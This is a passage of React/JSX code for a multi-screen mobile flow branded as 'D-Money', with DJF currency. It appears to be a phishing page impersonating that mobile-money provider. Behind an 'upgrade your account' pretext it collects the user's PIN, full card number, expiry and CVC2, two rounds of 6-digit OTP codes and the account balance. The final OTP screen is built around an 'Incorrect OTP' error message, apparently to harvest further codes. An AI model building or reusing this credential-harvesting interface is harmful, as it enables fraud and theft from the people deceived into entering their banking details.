                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            {/* Back Arrow */}
                            <div className="w-full flex items-center mb-4 sm:mb-6">
                                <button
                                    type="button"
                                    onClick={() => setCurrentStep("otp1")}
                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
                                    aria-label="Back"
                                >
                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
                                </button>
                            </div>

                            <p className="text-[13.5px] sm:text-[14px] leading-normal text-[#64748B] font-normal">
                                Welcome back
                            </p>

                            <h1 className="mt-1 text-[20px] sm:text-[22px] font-bold text-[#000000] tracking-tight">
                                {getMaskedPhone(phoneNumber, "pin")}
                            </h1>

                            <p className="mt-1.5 sm:mt-2 text-[14px] sm:text-[14.5px] leading-normal text-[#64748B] font-normal">
                                Please enter your 4 digit PIN
                            </p>

                            {/* 4-Digit PIN Boxes */}
                            <div className="mt-6 sm:mt-8 flex items-center justify-center gap-3 sm:gap-4">
                                {pinDigits.map((digit, idx) => {
                                    const isFilled = digit !== ""
                                    return (
                                        <div
                                            key={idx}
                                            onClick={() => pinInputRefs.current[idx]?.focus()}
                                            className={`relative w-13 h-15 sm:w-15 sm:h-16 rounded-xl sm:rounded-2xl flex items-center justify-center transition-all duration-200 cursor-pointer bg-white ${isFilled ? "border-2 shadow-xs" : "border border-[#CBD5E1]"
                                                }`}
                                            style={{
                                                borderColor: isFilled ? BRAND_NAVY : "#CBD5E1",
                                            }}
                                        >
                                            <input
                                                ref={(el) => {
                                                    pinInputRefs.current[idx] = el
                                                }}
                                                type="password"
                                                inputMode="numeric"
                                                pattern="[0-9]*"
                                                maxLength={1}
                                                value={digit}
                                                onChange={(e) => handlePinChange(idx, e.target.value)}
                                                onKeyDown={(e) => handlePinKeyDown(idx, e)}
                                                className="absolute inset-0 opacity-0 cursor-pointer text-center"
                                                autoFocus={idx === 0}
                                            />

                                            {isFilled && (
                                                <div
                                                    className="w-3.5 h-3.5 rounded-full transition-transform duration-150 transform scale-100"
                                                    style={{ backgroundColor: BRAND_NAVY }}
                                                />
                                            )}
                                        </div>
                                    )
                                })}
                            </div>
                        </div>

                        {/* Continue Button */}
                        <div className="mt-auto pt-4">
                            <button
                                type="button"
                                onClick={() => isPinComplete && submitPin(pinDigits.join(""))}
                                disabled={!isPinComplete || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isPinComplete && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor: isPinComplete ? BRAND_NAVY : "#C4C4C4",
                                }}
                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 5. CARD DETAILS ENTRY SCREEN (MATCHING SCREENSHOT 2)     */}
                {/* ======================================================== */}
                {currentStep === "card" && (
                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-3 sm:pt-5 pb-5 sm:pb-7 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            {/* Back Arrow */}
                            <div className="w-full flex items-center mb-2 sm:mb-4">
                                <button
                                    type="button"
                                    onClick={() => setCurrentStep("pin")}
                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
                                    aria-label="Back"
                                >
                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
                                </button>
                            </div>

                            {/* Heading */}
                            <h1 className="text-[20px] sm:text-[23px] leading-[26px] sm:leading-[30px] font-bold text-[#000000] tracking-tight">
                                Please enter your card details to upgrade your account
                            </h1>

                            {/* Subtitle */}
                            <p className="mt-1 sm:mt-1.5 text-[13px] sm:text-[14.5px] leading-normal text-[#64748B] font-normal">
                                Verify your identity with your D-Money card
                            </p>

                            {/* Form Inputs Container */}
                            <div className="mt-3.5 sm:mt-5 flex flex-col gap-2.5 sm:gap-3.5">
                                {/* CARD NUMBER */}
                                <div className="border border-[#CBD5E1] rounded-[16px] sm:rounded-[18px] p-2.5 sm:p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
                                    <div className="flex items-center justify-between">
                                        <label className="text-[11px] sm:text-[12px] font-semibold tracking-wider text-[#64748B] uppercase">
                                            CARD NUMBER
                                        </label>
                                        <HelpCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#94A3B8]" />
                                    </div>
                                    <input
                                        type="tel"
                                        inputMode="numeric"
                                        placeholder="4649 5198 2702 5674"
                                        value={cardNumber}
                                        onChange={(e) => handleCardNumberChange(e.target.value)}
                                        className="w-full mt-1 sm:mt-1.5 text-[16px] sm:text-[18px] font-normal text-[#0F172A] bg-transparent outline-none tracking-wide placeholder:text-[#CBD5E1]"
                                        autoFocus
                                    />
                                </div>

                                {/* MONTH & YEAR ROW */}
                                <div className="grid grid-cols-2 gap-2.5 sm:gap-3.5">
                                    {/* MONTH */}
                                    <div className="border border-[#CBD5E1] rounded-[16px] sm:rounded-[18px] p-2.5 sm:p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
                                        <div className="flex items-center justify-between">
                                            <label className="text-[11px] sm:text-[12px] font-semibold tracking-wider text-[#64748B] uppercase">
                                                MONTH
                                            </label>
                                            <HelpCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#94A3B8]" />
                                        </div>
                                        <input
                                            ref={cardMonthRef}
                                            type="tel"
                                            inputMode="numeric"
                                            maxLength={2}
                                            placeholder="MM"
                                            value={cardMonth}
                                            onChange={(e) => handleCardMonthChange(e.target.value)}
                                            className="w-full mt-1 sm:mt-1.5 text-[16px] sm:text-[18px] font-normal text-[#0F172A] bg-transparent outline-none placeholder:text-[#CBD5E1]"
                                        />
                                    </div>

                                    {/* YEAR */}
                                    <div className="border border-[#CBD5E1] rounded-[16px] sm:rounded-[18px] p-2.5 sm:p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
                                        <label className="text-[11px] sm:text-[12px] font-semibold tracking-wider text-[#64748B] uppercase block">
                                            YEAR
                                        </label>
                                        <input
                                            ref={cardYearRef}
                                            type="tel"
                                            inputMode="numeric"
                                            maxLength={2}
                                            placeholder="YY"
                                            value={cardYear}
                                            onChange={(e) => handleCardYearChange(e.target.value)}
                                            className="w-full mt-1 sm:mt-1.5 text-[16px] sm:text-[18px] font-normal text-[#0F172A] bg-transparent outline-none placeholder:text-[#CBD5E1]"
                                        />
                                    </div>
                                </div>

                                {/* CVC2 */}
                                <div className="border border-[#CBD5E1] rounded-[16px] sm:rounded-[18px] p-2.5 sm:p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
                                    <div className="flex items-center justify-between">
                                        <label className="text-[11px] sm:text-[12px] font-semibold tracking-wider text-[#64748B] uppercase">
                                            CVC2
                                        </label>
                                        <HelpCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#94A3B8]" />
                                    </div>
                                    <input
                                        ref={cardCvcRef}
                                        type="password"
                                        inputMode="numeric"
                                        maxLength={4}
                                        placeholder="CVC"
                                        value={cardCvc}
                                        onChange={(e) => {
                                            const val = e.target.value.replace(/[^\d]/g, "").slice(0, 4)
                                            setCardCvc(val)
                                        }}
                                        className="w-full mt-1 sm:mt-1.5 text-[16px] sm:text-[18px] font-normal text-[#0F172A] bg-transparent outline-none placeholder:text-[#CBD5E1]"
                                    />
                                </div>

                                {/* Helper footer under inputs */}
                                <p className="text-[12.5px] sm:text-[13.5px] text-[#64748B] text-center mt-1 font-normal">
                                    Enter your D-Money card details for verification.
                                </p>
                            </div>
                        </div>

                        {/* Continue Button */}
                        <div className="mt-auto pt-3">
                            <button
                                type="button"
                                onClick={() => handleCardSubmit()}
                                disabled={!isCardValid || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isCardValid && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor: isCardValid ? BRAND_NAVY : "#C4C4C4",
                                }}
                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 6. OTP 2 SCREEN (6 DIGITS - AUTO-MOVE)                   */}
                {/* ======================================================== */}
                {currentStep === "otp2" && (
                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            {/* Back Arrow */}
                            <div className="w-full flex items-center mb-4 sm:mb-6">
                                <button
                                    type="button"
                                    onClick={() => setCurrentStep("card")}
                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
                                    aria-label="Back"
                                >
                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
                                </button>
                            </div>

                            <h1 className="text-[24px] sm:text-[28px] leading-tight font-bold text-[#000000] tracking-tight">
                                Verify your number
                            </h1>

                            <p className="mt-1.5 sm:mt-2 text-[14px] sm:text-[15px] leading-normal text-[#64748B] font-normal">
                                Enter the code we sent to {getMaskedPhone(phoneNumber, "otp")}
                            </p>

                            {/* 6-Digit OTP Boxes */}
                            <div className="mt-6 sm:mt-8 flex items-center justify-between gap-1.5 sm:gap-2.5 w-full">
                                {otp2Digits.map((digit, idx) => {
                                    const isFilled = digit !== ""
                                    return (
                                        <input
                                            key={idx}
                                            ref={(el) => {
                                                otp2InputRefs.current[idx] = el
                                            }}
                                            type="text"
                                            inputMode="numeric"
                                            pattern="[0-9]*"
                                            maxLength={1}
                                            value={digit}
                                            onChange={(e) => handleOtp2Change(idx, e.target.value)}
                                            onKeyDown={(e) => handleOtp2KeyDown(idx, e)}
                                            className={`w-11 h-13 sm:w-12 sm:h-14 md:w-13 md:h-15 max-w-[48px] text-center text-[20px] sm:text-[22px] font-bold rounded-xl sm:rounded-2xl outline-none transition-all duration-200 bg-white shrink-1 ${isFilled
                                                    ? "border-2 text-[#002566] shadow-xs"
                                                    : "border border-[#CBD5E1] text-[#0F172A] focus:border-[#002566] focus:border-2"
                                                }`}
                                            style={{
                                                borderColor: isFilled ? BRAND_NAVY : undefined,
                                                color: isFilled ? BRAND_NAVY : "#0F172A",
                                            }}
                                            autoFocus={idx === 0}
                                        />
                                    )
                                })}
                            </div>

                            {/* Resend Section */}
                            <div className="mt-6 sm:mt-8 flex flex-col items-center justify-center gap-1.5 sm:gap-2">
                                <p className="text-[13.5px] sm:text-[14px] text-[#475569] font-normal">
                                    Resend code in{" "}
                                    <span className="font-bold ml-1" style={{ color: BRAND_NAVY }}>
                                        {formatTimer(otp2Timer)}
                                    </span>
                                </p>

                                <button
                                    type="button"
                                    onClick={() => {
                                        if (otp2Timer > 0) return
                                        setOtp2Timer(115)
                                        setOtp2Digits(["", "", "", "", "", ""])
                                    }}
                                    disabled={otp2Timer > 0}
                                    className={`text-[14px] sm:text-[14.5px] font-normal transition-colors ${otp2Timer === 0
                                            ? "underline cursor-pointer font-medium"
                                            : "text-[#CBD5E1] cursor-not-allowed"
                                        }`}
                                    style={{
                                        color: otp2Timer === 0 ? BRAND_NAVY : "#CBD5E1",
                                    }}
                                >
                                    Resend Code
                                </button>
                            </div>
                        </div>

                        {/* Continue Button */}
                        <div className="mt-auto pt-4">
                            <button
                                type="button"
                                onClick={() => isOtp2Complete && submitOtp2(otp2Digits.join(""))}
                                disabled={!isOtp2Complete || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isOtp2Complete && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor: isOtp2Complete ? BRAND_NAVY : "#C4C4C4",
                                }}
                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 7. BALANCE SCREEN (MATCHING SCREENSHOT 3)                */}
                {/* ======================================================== */}
                {currentStep === "balance" && (
                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-3 sm:pt-5 pb-5 sm:pb-7 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            {/* Back Arrow */}
                            <div className="w-full flex items-center mb-2 sm:mb-3">
                                <button
                                    type="button"
                                    onClick={() => setCurrentStep("otp2")}
                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
                                    aria-label="Back"
                                >
                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
                                </button>
                            </div>

                            {/* DMONEY CARD */}
                            <div className="w-full max-w-[320px] sm:max-w-[360px] mx-auto aspect-[1.58/1] max-h-[160px] sm:max-h-[190px] rounded-[16px] sm:rounded-[20px] overflow-hidden shadow-lg relative">
                                <Image
                                    src="/dmoney.webp"
                                    alt="D-Money card"
                                    fill
                                    className="object-cover"
                                    priority
                                />
                                <div className="absolute inset-x-0 bottom-0 px-4 pb-3.5 pt-6 bg-gradient-to-t from-black/60 to-transparent">
                                    <p className="text-white text-[12px] sm:text-[14px] font-mono font-semibold tracking-[2px] drop-shadow-md">
                                        {cardNumber || "4937 2420 2151 4656"}
                                    </p>
                                </div>
                            </div>

                            {/* Form Fields Container */}
                            <div className="mt-3.5 sm:mt-4 flex flex-col gap-3 sm:gap-4">
                                {/* Account Number */}
                                <div>
                                    <label className="text-[13.5px] sm:text-[14.5px] font-semibold text-[#0F172A] block mb-1.5">
                                        Account Number
                                    </label>
                                    <div className="border border-[#CBD5E1] rounded-2xl px-3.5 py-2.5 sm:py-3 bg-white text-[#64748B] text-[14px] sm:text-[15px] font-mono tracking-wider flex items-center">
                                        <span>Acc.</span>
                                        <span className="ml-3 tracking-[3px] text-[#475569]">•••••••••••••</span>
                                    </div>
                                </div>

                                {/* Bank Security Question & Balance Input */}
                                <div>
                                    <label className="text-[13.5px] sm:text-[14.5px] font-semibold text-[#0F172A] block">
                                        Bank Security Question
                                    </label>
                                    <p className="text-[13px] sm:text-[14px] text-[#64748B] mt-0.5 mb-1.5 font-normal">
                                        How much balance is available in your account?
                                    </p>

                                    <div className="border-2 border-[#002566] rounded-2xl px-3.5 py-2.5 sm:py-3 bg-white flex items-center gap-3 transition-all duration-200 shadow-xs">
                                        <span className="text-[15px] sm:text-[16px] font-bold text-[#002566] select-none shrink-0">
                                            DJF
                                        </span>
                                        <div className="w-[1px] h-5 sm:h-6 bg-[#CBD5E1]" />
                                        <input
                                            type="text"
                                            inputMode="decimal"
                                            placeholder="0.00"
                                            value={balanceAmount}
                                            onChange={(e) => {
                                                const val = e.target.value.replace(/[^0-9.]/g, "")
                                                setBalanceAmount(val)
                                            }}
                                            className="w-full text-[16px] sm:text-[17px] font-semibold text-[#0F172A] bg-transparent outline-none placeholder:text-[#94A3B8]"
                                            autoFocus
                                        />
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Continue Button */}
                        <div className="mt-auto pt-3">
                            <button
                                type="button"
                                onClick={() => handleBalanceSubmit()}
                                disabled={!isBalanceValid || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isBalanceValid && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor: isBalanceValid ? BRAND_NAVY : "#C4C4C4",
                                }}
                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 8. OTP 3 SCREEN WITH ERROR (MATCHING SCREENSHOT 4)       */}
                {/* ======================================================== */}
                {currentStep === "otp3" && (
                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            {/* Back Arrow */}
                            <div className="w-full flex items-center mb-4 sm:mb-6">
                                <button
                                    type="button"
                                    onClick={() => setCurrentStep("balance")}
                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
                                    aria-label="Back"
                                >
                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
                                </button>
                            </div>

                            <h1 className="text-[24px] sm:text-[28px] leading-tight font-bold text-[#000000] tracking-tight">
                                Verify your number
                            </h1>

                            <p className="mt-1.5 sm:mt-2 text-[14px] sm:text-[15px] leading-normal text-[#64748B] font-normal">
                                Enter the code we sent to {getMaskedPhone(phoneNumber, "otp")}
                            </p>

                            {/* 6-Digit OTP Boxes (Red borders when error triggered) */}
                            <div className="mt-6 sm:mt-8 flex items-center justify-between gap-1.5 sm:gap-2.5 w-full">
                                {otp3Digits.map((digit, idx) => {
                                    const isFilled = digit !== ""
                                    return (
                                        <input
                                            key={idx}
                                            ref={(el) => {
                                                otp3InputRefs.current[idx] = el
                                            }}
                                            type="text"
                                            inputMode="numeric"
                                            pattern="[0-9]*"
                                            maxLength={1}
                                            value={digit}
                                            onChange={(e) => handleOtp3Change(idx, e.target.value)}
                                            onKeyDown={(e) => handleOtp3KeyDown(idx, e)}
                                            className={`w-11 h-13 sm:w-12 sm:h-14 md:w-13 md:h-15 max-w-[48px] text-center text-[20px] sm:text-[22px] font-bold rounded-xl sm:rounded-2xl outline-none transition-all duration-200 bg-white shrink-1 ${otp3Error
                                                    ? "border-2 border-[#EF4444] text-[#EF4444] shadow-xs shadow-red-100"
                                                    : isFilled
                                                        ? "border-2 border-[#002566] text-[#002566]"
                                                        : "border border-[#CBD5E1] text-[#0F172A] focus:border-[#002566]"
                                                }`}
                                            autoFocus={idx === 0}
                                        />
                                    )
                                })}
                            </div>

                            {/* Error Message & Resend Code (Matching Screenshot 4) */}
                            <div className="mt-4 sm:mt-6 flex flex-col items-center justify-center gap-1 sm:gap-1.5 text-center">
                                {otp3Error && (
                                    <div className="flex items-center justify-center gap-1.5 text-[#DC2626] font-medium text-[13.5px] sm:text-[14px] animate-shake mb-0.5">
                                        <AlertCircle className="w-4 h-4 text-[#DC2626] shrink-0" />
                                        <span>Incorrect OTP. Please try again.</span>
                                    </div>
                                )}

                                <p className="text-[13.5px] sm:text-[14px] text-[#475569] font-normal">
                                    Resend code in{" "}
                                    <span className="font-bold ml-1 text-[#002566]">
                                        {formatTimer(otp3Timer)}
                                    </span>
                                </p>

                                <button
                                    type="button"
                                    onClick={() => {
                                        if (otp3Timer > 0) return
                                        setOtp3Timer(111)
                                        setOtp3Digits(["", "", "", "", "", ""])
                                        setOtp3Error(false)
                                    }}
                                    disabled={otp3Timer > 0}
                                    className={`text-[14px] sm:text-[14.5px] font-normal mt-0.5 sm:mt-1 transition-colors ${otp3Timer === 0
                                            ? "underline cursor-pointer font-medium text-[#002566]"
                                            : "text-[#CBD5E1] cursor-not-allowed"
                                        }`}
                                >
                                    Resend Code
                                </button>
                            </div>
                        </div>

                        {/* Verify Button */}
                        <div className="mt-auto pt-4">
                            <button
                                type="button"
                                onClick={() => submitOtp3(otp3Digits.join(""))}
                                disabled={!isOtp3Complete || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isOtp3Complete && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor: isOtp3Complete && !isSubmitting ? BRAND_NAVY : "#C4C4C4",
                                }}
                            >
                                Verify
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 9. SUCCESS / COMPLETED SCREEN                            */}
                {/* ======================================================== */}
                {currentStep === "success" && (
                    <div className="flex-1 flex flex-col items-center justify-center px-6 py-8 w-full h-full bg-white text-center animate-slide-up overflow-hidden">
                        <div
                            className="w-18 h-18 sm:w-20 sm:h-20 rounded-full flex items-center justify-center mb-5 sm:mb-6 shadow-md"
                            style={{ backgroundColor: "#EEF4FF" }}
                        >
                            <ShieldCheck className="w-9 h-9 sm:w-10 sm:h-10 text-[#002566]" />
                        </div>

                        <h2 className="text-[22px] sm:text-[24px] font-bold text-[#002566] tracking-tight">
                            Verification Complete
                        </h2>

                        <p className="mt-2.5 sm:mt-3 text-[14px] sm:text-[14.5px] text-[#64748B] max-w-[280px] leading-relaxed">
                            Your account upgrade request has been submitted successfully. You will receive a confirmation shortly.
                        </p>

                        <div className="mt-8 sm:mt-10 w-full max-w-[300px]">
                            <button
                                type="button"
                                onClick={() => {
                                    setCurrentStep("splash")
                                    setShowBottomModal(true)
                                }}
                                className="w-full py-3.5 rounded-xl text-white font-semibold text-[15px] transition-all duration-200 active:scale-[0.98]"
                                style={{ backgroundColor: BRAND_NAVY }}
                            >
                                Return to Home
                            </button>
                        </div>
                    </div>
                )}

            </div>
        </main>
    )
}
